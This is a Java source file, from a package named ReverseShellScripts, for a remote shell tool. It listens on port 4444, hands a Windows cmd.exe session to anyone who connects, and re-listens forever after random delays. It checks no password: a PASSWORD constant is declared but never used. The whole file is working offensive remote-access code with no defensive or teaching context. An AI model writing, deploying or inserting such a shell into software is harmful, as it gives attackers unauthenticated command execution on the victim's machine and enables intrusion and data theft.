package ReverseShellScripts;

import java.io.*;
import java.net.*;
import java.util.Random;

//listener for reverse shell to allow connection within same network

public class ReverseShellListener {
    public static void main(String[] args) {
        int port = 4444;
        Random random = new Random();
        boolean isConnected = false;
        final String PASSWORD = "PASSWORD";


        while (true) {  // run forever
            try (ServerSocket serverSocket = new ServerSocket(port)) {
                System.out.println("Listening for incoming connection on port " + port + "...");

                try (Socket socket = serverSocket.accept()) {
                    System.out.println("Connection received from " + socket.getInetAddress());
                    isConnected = true;  // connection established

                    Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();

                    InputStream processInput = process.getInputStream();
                    OutputStream processOutput = process.getOutputStream();
                    InputStream socketInput = socket.getInputStream();
                    OutputStream socketOutput = socket.getOutputStream();

                    while (!socket.isClosed() && process.isAlive()) {
                        while (processInput.available() > 0) {
                            socketOutput.write(processInput.read());
                        }
                        while (socketInput.available() > 0) {
                            processOutput.write(socketInput.read());
                        }

                        socketOutput.flush();
                        processOutput.flush();

                        Thread.sleep(50);
                    }

                    process.destroy();
                    System.out.println("Shell closed.");
                    isConnected = false;  // reset for retry
                } catch (Exception e) {
                    System.err.println("Error during connection: " + e.getMessage());
                    e.printStackTrace();
                }
            } catch (IOException e) {
                System.err.println("Could not listen on port " + port);
                e.printStackTrace();
            }

            try {
                int wait = 1000 + random.nextInt(14000); // 1 to 15 seconds
                System.out.println("Attempting to reconnect in " + wait + " milliseconds.");
                Thread.sleep(wait);
            } catch (InterruptedException ex) {
                System.err.println("Sleep interrupted");
                ex.printStackTrace();
            }
        }
    }
}
